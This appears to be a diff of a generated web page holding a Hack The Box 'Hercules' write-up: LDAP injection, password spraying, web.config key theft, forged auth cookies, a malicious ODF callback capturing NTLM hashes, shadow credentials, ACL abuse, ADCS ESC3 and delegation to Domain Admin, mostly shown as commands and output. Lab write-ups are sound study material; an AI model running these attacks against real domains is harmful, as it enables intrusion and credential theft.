@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="color-scheme" content="light dark">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.6.0.842711649901">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.6.0.842711851664">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 4.6.0">
@@ -46,12 +46,12 @@
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../../../resources/css/retype.css?v=4.6.0.842711649901" rel="stylesheet">
+    <link href="../../../../resources/css/retype.css?v=4.6.0.842711851664" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../../../resources/js/config.js?v=4.6.0.842711649901" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../../../resources/js/config.js?v=4.6.0.842711851664" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../../../resources/js/retype.js?v=4.6.0" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=4.6.0.842711649901" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=4.6.0.842711649901" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../../../resources/js/lunr.js?v=4.6.0.842711851664" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../../../resources/js/prism.js?v=4.6.0.842711851664" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -316,9 +316,12 @@ Version: v1.0.3 (9dad6e1) - 10/21/25 - Ronnie Flathers @ropnop
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-            <h5>The payload needs to be properly encoded (double-URL) so that the backend (IIS/ASP.NET) processes the request. !!!</h5>
+<p>The payload needs to be properly encoded (double-URL) so that the backend (IIS/ASP.NET) processes the request.</p>
+        </div>
+    </div>
+</div>
 <p>Similar to SQL Injection, an LDAP injection vulnerability results when an application injects unfiltered user input directly into an LDAP statement. Because of the rate-limiting, we need to write a custom script that allows us to brute force valid usernames and LDAP fields much easier.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-python"><code v-pre class="language-python">#!/usr/bin/env python3
 
 import argparse
@@ -575,7 +578,7 @@ if __name__ == &quot;__main__&quot;:
     main()</code></pre>
 </doc-codeblock></div>
 <p>The server returns different error messages based on the result of the filter. In case the response contains <code translate="no" v-pre>Login attempt failed</code>, the filter returned a match. The most interesting fields to check are the description, because it might contains a password. With the above script we can enumerate the usernames and check if they have a description field.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-2" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python ldap_inject.py -w users.txt --brute description
 [-] No field value found for object administrator
 [-] No field value found for object admin
@@ -618,7 +621,7 @@ change*th1s_p@ssw()rd!!
 [*] Done.</code></pre>
 </doc-codeblock></div>
 <p>After running the script, a potential password was found for the user <code translate="no" v-pre>johnathan.j</code> in his description field. However, when we check which users are able to login to the website, we see that <code translate="no" v-pre>johnathan.j</code> cannot login with this password. Naturally, we start password spraying on the other accounts we found.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-3" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc.hercules.htb -u users.txt -p 'change*th1s_p@ssw()rd!!' -d hercules.htb -k
 SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False)
 SMB         dc.hercules.htb 445    dc               [-] hercules.htb\administrator:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
@@ -663,12 +666,12 @@ SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:chang
     <figcaption class="caption">Download Form</figcaption>
 </figure>
 <p>The download function is vulnerable to LFI and after fuzzing for some files we get a hit for <code translate="no" v-pre>/Home/Download?fileName=../../web.config</code>.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-4" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ffuf -request download.req -w $SECLISTS/Discovery/Web-Content/common.txt -fs 485 -fc 500 -ic -c
 web.config              [Status: 200, Size: 4896, Words: 643, Lines: 94, Duration: 20ms]</code></pre>
 </doc-codeblock></div>
 <p>A snippet of the contents reveal a <code translate="no" v-pre>machineKey</code> which includes the <code translate="no" v-pre>decryptionKey</code> and <code translate="no" v-pre>validationKey</code> (AES + HMACSHA256). Having knowledge of these values allows us to forge/modify Forms Authentication cookies (and impersonate any user).</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-5" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
 &lt;configuration&gt;
   &lt;system.web&gt;
@@ -692,7 +695,7 @@ web.config              [Status: 200, Size: 4896, Words: 643, Lines: 94, Duratio
 </doc-codeblock></div>
 <p>With the decryption keys, we can first try to decrypt our own <code translate="no" v-pre>FormsAuthenticationTicket</code> and see how the ticket is structured. If we can modify the role of our user we might be able to forge a ticket with a privileged role that has access to more features like uploading files.</p>
 <p>For this part I will have to switch to my Windows VM and compile a small <code translate="no" v-pre>.NET Console Application</code>. You can also do this on Linux with the <code translate="no" v-pre>dotnet sdk</code>.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-6" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-csharp"><code v-pre class="language-csharp">using System.Globalization;
 using AspNetCore.LegacyAuthCookieCompat;
 
@@ -759,11 +762,11 @@ class Program
 }</code></pre>
 </doc-codeblock></div>
 <p>To compile the project, we also need to install <code translate="no" v-pre>AspNetCore.LegacyAuthCookieCompat</code> in our project directory.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-7" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5</code></pre>
 </doc-codeblock></div>
 <p>When decoding our own cookie we get the following information:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-8" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; .\AuthConsole.exe decode 93E217AE4C0C030222E4FCDE6A8ECDA8FCE20301A658E0C718FC4BB75E1E342E84316B312918B13B7CAFF855F52ECFC1718047B9D38DC8EEB9DC82EC5FB74C04739FDF787D4BA826A9C6A8E597BD76E6DD1A51636B4E3AD6A72C06CE9AD00626803E0A655C192FBE6E1733C3D6FABDBF633A56F39366DF0C787DDD6FD31D0F6A753AB13432DBCF1CEA7311CB30EA2C19C6DF1066191C75F8B4D9AE82160415FE
 ---- FormsAuthenticationTicket ----
 Version     : 1
@@ -776,13 +779,13 @@ CookiePath  : /
 -----------------------------------</code></pre>
 </doc-codeblock></div>
 <p>It looks like <code translate="no" v-pre>ken.w</code> has the <code translate="no" v-pre>Web Users</code> role. This role does not have the permission to upload any files, so after changing our role to <code translate="no" v-pre>Web Administrators</code> (which is a pure guess at this point) we can generate the cookie. Next, we replace our current cookie with the forged one in our browser session via <code translate="no" v-pre>devtools</code>.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-9" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; .\AuthConsole.exe gen
 [+] Encrypted cookie value (place in .ASPXAUTH):
 E564F870BE6A8AA09DD2D8780E7739FD9212779828BC57940193DCCDB3CB056809DF188C0670160D6C958313AAAC2D235796761FF3A83F906A1D7490F190C356F3FA66D42A65E6236C0614589EB30F2B78272895F0F93CCBA5510774CFC0B04A6B2F2EBD807953394CF4747701FE8BB797D820495A8366075EC239426ED4AFFF8B9A5CD524E22EB5771FB26C803BBD2588A631ABFE2B6754EEA406778DE7B29098485C9532E8C04D88D605E2BF3BC44ECDAF2FFD44853F65711834A0698CC33A</code></pre>
 </doc-codeblock></div>
 <p>After some experimenting with the upload form, the only files we are allowed to upload are <code translate="no" v-pre>docx</code> and <code translate="no" v-pre>odt</code> files. We can try to create a malicious document that make a callback to our machine whenever a user opens the document. This allows us to capture hashes via <code translate="no" v-pre>Responder</code>. We will use <a href="https://github.com/lof1sec/Bad-ODF">Bad-ODF.py</a> to create our malicious document.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-10" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python Bad-ODF.py
     ____            __      ____  ____  ______
    / __ )____ _____/ /     / __ \/ __ \/ ____/
@@ -805,7 +808,7 @@ Please enter IP of listener: 10.10.14.171</code></pre>
     <figcaption class="caption">Responder NTLM Hash Capture</figcaption>
 </figure>
 <p>The hash can be cracked with <code translate="no" v-pre>hashcat</code> and we get the password <code translate="no" v-pre>Prettyprincess123!</code>.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="ldap-injection-code-11" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat natalie.a.hash $ROCKYOU
 
 &lt;HASH&gt;:Prettyprincess123!
@@ -816,7 +819,7 @@ SMB         dc.hercules.htb 445    dc               [+] hercules.htb\natalie.a:P
 </doc-codeblock></div>
 <h2 id="bloodhound-enumeration">BloodHound Enumeration</h2>
 <p>We collect AD data with BloodHound. Just upload all JSON files one by one (no zip), because one file gave an error. It also seems like RustHound is the only tool that gave good results on BloodHound CE.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="bloodhound-enumeration-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">rusthound-ce --domain hercules.htb --name-server 10.129.131.250 -f dc.hercules.htb -k --zip</code></pre>
 </doc-codeblock></div>
 <p>We continue enumerating bloodhound and discover that Natalie has <code translate="no" v-pre>GenericWrite</code> over the <code translate="no" v-pre>WEB DEPARTMENT</code> OU and several users, of which <code translate="no" v-pre>bob.w</code> looks the most interesting. Bob is a member of the <code translate="no" v-pre>Recruitment Managers</code> and might have more access over other objects (that is not directly visible via BloodHound).</p>
@@ -825,7 +828,7 @@ SMB         dc.hercules.htb 445    dc               [+] hercules.htb\natalie.a:P
     <figcaption class="caption">BloodHound Path from Natalie</figcaption>
 </figure>
 <p>The <code translate="no" v-pre>GenericWrite</code> permission allows writing to the <code translate="no" v-pre>msds-KeyCredentialLink</code> property which allows creating <code translate="no" v-pre>Shadow Credentials</code> on the object and authenticate as the principal using kerberos PKINIT (if ADCS is in place). We perform the <code translate="no" v-pre>Shadow Credential</code> attack to recover the NTLM hash of Bob.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="bloodhound-enumeration-code-2" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/natalie.a:Prettyprincess123!
 $ export KRB5CCNAME=natalie.a.ccache
 $ certipy shadow auto -k -no-pass -account bob.w -dc-host dc.hercules.htb
@@ -853,7 +856,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f</code></pre>
 </doc-codeblock></div>
 <p>Using <code translate="no" v-pre>BloodyAD</code> we can further enumerate objects we have <code translate="no" v-pre>WRITE</code> permission over.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="bloodhound-enumeration-code-3" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/bob.w -hashes :8a65c74e8f0073babbfac6725c66cc3f
 $ export KRB5CCNAME=bob.w.ccache
 $ bloodyAD -k -d hercules.htb --host dc.hercules.htb get writable --detail
@@ -875,7 +878,7 @@ cn: WRITE</code></pre>
     <figcaption class="caption">BloodHound Path from Stephen</figcaption>
 </figure>
 <p>We leverage these permissions to move Stephen to the <code translate="no" v-pre>Web Department</code> OU and subsequently doing the same attack as before to retrieve his NTLM hash. We can only move an object if we have the <code translate="no" v-pre>CREATE_CHILD</code> over the <code translate="no" v-pre>Web Department</code> OU and the <code translate="no" v-pre>DELETE_CHILD</code> over the <code translate="no" v-pre>Security Department</code> OU and <code translate="no" v-pre>WRITE_PROPERTY</code> over the <code translate="no" v-pre>distinguisedName</code> of the user we want to move. This can be double-checked with some DACL checks.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="bloodhound-enumeration-code-4" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc ldap dc.hercules.htb --use-kcache -M whoami
 LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb)
 LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\bob.w from ccache 
@@ -902,14 +905,14 @@ DACLREAD    dc.hercules.htb 389    DC                   Trustee (SID)           
 </code></pre>
 </doc-codeblock></div>
 <p>We are part of the <code translate="no" v-pre>Recruitment Managers</code> group and see that it has the required permissions to move the object. Let&#x27;s now proceed to do the actual movement.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="bloodhound-enumeration-code-5" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ powerview hercules.htb/bob.w@dc.hercules.htb -k --no-pass
 ╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]
 ╰─PV ❯ Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHercules,DC=hercules,DC=htb'
 [2025-10-21 18:11:32] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb</code></pre>
 </doc-codeblock></div>
 <p>Now we can use <code translate="no" v-pre>natalie.a</code> to do get the NTLM hash of Stephen, because the <code translate="no" v-pre>GenericWrite</code> permissions are now inherited over to this object.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="bloodhound-enumeration-code-6" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=natalie.a.ccache certipy shadow auto -k -no-pass -account stephen.m -dc-host dc.hercules.htb
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
@@ -940,7 +943,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
     <figcaption class="caption">BloodHound Auditor Membership</figcaption>
 </figure>
 <p>We reset the account with <code translate="no" v-pre>BloodyAD</code> since we have the <code translate="no" v-pre>ForceChangePassword</code> permission.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="bloodhound-enumeration-code-7" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210
 $ export KRB5CCNAME=stephen.m.ccache
 $ bloodyAD -k -d hercules.htb --host dc.hercules.htb set password auditor 'Pwn3d_by_ACLs!'
@@ -966,10 +969,13 @@ evil-winrm-py PS C:\Users\auditor\desktop&gt; cat user.txt
             </svg>
         </div>
         <div class="pr-5 ml-3 w-full">
-            <h5>The regular evil-winrm didn&#x27;t work, so I switched to the python version !!!</h5>
+<p>The regular evil-winrm didn&#x27;t work, so I switched to the python version</p>
+        </div>
+    </div>
+</div>
 <h2 id="root">Root</h2>
 <p>Again we look and the permissions of the <code translate="no" v-pre>auditor</code> user.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb get writable
 
 distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=hercules,DC=htb
@@ -984,7 +990,7 @@ distinguishedName: CN=Auditor,OU=Security Department,OU=DCHERCULES,DC=hercules,D
 permission: WRITE</code></pre>
 </doc-codeblock></div>
 <p>Our user has full control (<code translate="no" v-pre>WriteDACL</code>) over the <code translate="no" v-pre>Forest Migration</code> OU. These permissions allows us to add ourself as the owner of this OU and give use the <code translate="no" v-pre>GenericAll</code> permission (a.k.a. FullControl).</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-2" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb set owner 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor
 [+] Old owner S-1-5-21-1889966460-2597381952-958560702-512 is now replaced by auditor on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
 
@@ -992,7 +998,7 @@ $ bloodyAD -k -d hercules.htb --host dc.hercules.htb add genericAll 'OU=Forest M
 [+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre>
 </doc-codeblock></div>
 <p>After we configure the <code translate="no" v-pre>GenericAll</code> over the OU, we have effectively given ourself control over all objects contained within it. The reason we could not do this before, even though we are part of a group that has the same permissions is because ACL inheritence was probably disabled. By adding ourself as owner we can configure these ACLs ourself and apply the inheritence.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-3" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb get writable --otype USER
 
 distinguishedName: CN=Taylor Maxwell,OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
@@ -1024,7 +1030,7 @@ permission: WRITE</code></pre>
     <figcaption class="caption">ADCS ESC3 Path</figcaption>
 </figure>
 <p>So with our <code translate="no" v-pre>GenericAll</code> over this account, we can enable his account and reset his password.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-4" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb remove uac 'fernando.r' -f ACCOUNTDISABLE
 [-] ['ACCOUNTDISABLE'] property flags removed from fernando.r's userAccountControl
 
@@ -1032,7 +1038,7 @@ $ bloodyAD -k -d hercules.htb --host dc.hercules.htb set password fernando.r 'Pw
 [+] Password changed successfully!</code></pre>
 </doc-codeblock></div>
 <p>We confirm with Certipy the attack we identified with BloodHound.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-5" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy find -k -target dc.hercules.htb -vulnerable -stdout
 
 Template Name                       : EnrollmentAgent
@@ -1076,7 +1082,7 @@ Template Name                       : EnrollmentAgent
       ESC3                              : Template has Certificate Request Agent EKU set.</code></pre>
 </doc-codeblock></div>
 <p>We can now perform the attack. First we request a certificate for the <code translate="no" v-pre>EnrollmentAgent</code> template.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-6" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy req -k -target dc.hercules.htb -ca CA-HERCULES -template EnrollmentAgent -dc-ip 10.10.11.91 -dc-host dc.hercules.htb
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
@@ -1089,7 +1095,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'fernando.r.pfx'</code></pre>
 </doc-codeblock></div>
 <p>Subsequently, we can request a certificate on behalf of any user from any other template by including the initial certificate as proof. However, we are not able to request a certificate for the <code translate="no" v-pre>Administrator</code> account since this user is part of the <code translate="no" v-pre>Protected Users</code> group. One thing to note is that the <code translate="no" v-pre>IIS_Administrator</code> account is also part of the <code translate="no" v-pre>Forest Migration</code> OU.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-7" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc ldap dc.hercules.htb --use-kcache -M whoami -o USER='IIS_Administrator'
 LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb)
 LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\auditor from ccache 
@@ -1109,7 +1115,7 @@ WHOAMI      dc.hercules.htb 389    DC               sAMAccountName: iis_administ
     <figcaption class="caption">BloodHound Ashley Membership</figcaption>
 </figure>
 <p>So it seems like a natural move to request a certificate on behalf of this user.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-8" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ certipy req -k -target dc.hercules.htb -ca CA-HERCULES -template User -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx -dc-ip 10.10.11.91 -dc-host dc.hercules.htb -dcom
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
@@ -1140,7 +1146,7 @@ $ getTGT.py hercules.htb/ashley.b -hashes :1e719fbfddd226da74f644eac9df7fd2
 $ KRB5CCNAME=ashley.b.ccache evil-winrm-py -k -i dc.hercules.htb --ssl</code></pre>
 </doc-codeblock></div>
 <p>We then find some scripts and a mail on her desktop.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-9" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">evil-winrm-py PS C:\Users\ashley.b\Desktop\Mail&gt; type RE_ashley.eml
 --_004_MEYP282MB3102AC3B2MEYP282MB3102AUSP_
 Content-Type: multipart/alternative;
@@ -1190,7 +1196,7 @@ Content-Type: text/html; charset=&quot;us-ascii&quot;
 Content-Transfer-Encoding: quoted-printable</code></pre>
 </doc-codeblock></div>
 <p>They talk about a problem with resetting certain passwords due to the permission of old accounts. There is also a script located at <code translate="no" v-pre>C:\Users\ashley.b\Scripts\cleanup.ps1</code> that is responsible for turning off ACL protections on each object under the control of <code translate="no" v-pre>HERCULES\IT Support</code>.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-10" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-powershell"><code v-pre class="language-powershell">function CanPasswordChangeIn {
     param ($ace)
     if($ace.ActiveDirectoryRights -match &quot;ExtendedRight|GenericAll&quot;){
@@ -1248,7 +1254,7 @@ foreach($object in $objects){
 </figure>
 <p>The plan is to also reset the ACL permissions on the <code translate="no" v-pre>IIS_Administrator</code> account so we can reset its password via <code translate="no" v-pre>auditor</code>.
 To do this, we need to grant the <code translate="no" v-pre>GenericAll</code> permissions over the <code translate="no" v-pre>Forest Migration</code> OU to <code translate="no" v-pre>IT Support</code> so that after running the script the permissions are also applied to our target user.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-11" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=auditor.ccache bloodyAD -k -d hercules.htb --host dc.hercules.htb add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT Support'
 [+] IT Support has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb</code></pre>
 </doc-codeblock></div>
@@ -1257,7 +1263,7 @@ To do this, we need to grant the <code translate="no" v-pre>GenericAll</code> pe
     <figcaption class="caption">Cleanup Script Logs</figcaption>
 </figure>
 <p>Only after running the cleanup script we are able to do the enable of the IIS account. Due to cleanup scripts we also need to add our permissions over the <code translate="no" v-pre>Forest Migration</code> OU again.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-12" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ bloodyAD -k -d hercules.htb --host dc.hercules.htb add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor
 [+] auditor has now GenericAll on OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb
 
@@ -1272,7 +1278,7 @@ $ bloodyAD -k -d hercules.htb --host dc.hercules.htb set password IIS_Administra
     <img src="../../../../assets/images/writeups/hercules/bloodhound-iis-administrator.png" alt="BloodHound Path from IIS_Administrator" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1769" height="612" />
     <figcaption class="caption">BloodHound Path from IIS_Administrator</figcaption>
 </figure>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-13" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/IIS_Administrator:Pwn3d_by_ACLs!
 Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
 
@@ -1305,7 +1311,7 @@ Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its a
 <li>Pass the ticket and access the target, as the delegated other</li>
 </ol>
 <p>First, we need to obtain a TGT using the account NT hash to retrieve the TGT session key.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-14" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ iconv -f ASCII -t UTF-16LE &lt;(printf 'Pwn3d_by_ACLs!') | openssl dgst -md4 -provider legacy
 MD4(stdin)= b85458493b2354f14cde47b01ed69ab5
 
@@ -1318,7 +1324,7 @@ $ describeTicket.py IIS_Webserver\$.ccache | grep 'Ticket Session Key'
 [*] Ticket Session Key            : 53be5595e62fed2568632bef290d456b</code></pre>
 </doc-codeblock></div>
 <p>Change the user&#x27;s password with the TGT session key.</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-15" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ changepasswd.py -newhashes :53be5595e62fed2568632bef290d456b 'hercules.htb'/'IIS_Webserver$':'Pwn3d_by_ACLs!'@dc.hercules.htb -k
 Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
 
@@ -1328,7 +1334,7 @@ Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its a
 [!] User might need to change their password at next logon because we set hashes (unless password never expires is set).</code></pre>
 </doc-codeblock></div>
 <p>Finally, use the configured delegation to impersonate a user and request a service ticket for the desired service on the target machine:</p>
-<div class="codeblock-wrapper"><doc-codeblock>
+<div id="root-code-16" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getST.py -u2u -impersonate Administrator -spn 'cifs/dc.hercules.htb' -k -no-pass 'hercules.htb'/'IIS_Webserver$'
 Impacket v0.13.0.dev0+20250206.100953.075f2b10 - Copyright Fortra, LLC and its affiliated companies
 
@@ -1342,12 +1348,6 @@ SMB         DC.hercules.htb 445    DC               [*]  x64 (name:DC) (domain:h
 SMB         DC.hercules.htb 445    DC               [+] hercules.htb\Administrator from ccache (Pwn3d!)</code></pre>
 </doc-codeblock></div>
 <p>Holy cow, road to Domain Admin was a real brainfuck. This was by far one of the hardest boxes I solved. GG.</p>
-        </div>
-    </div>
-</div>
-        </div>
-    </div>
-</div>
 
                 
                 <!-- Required only on API pages -->
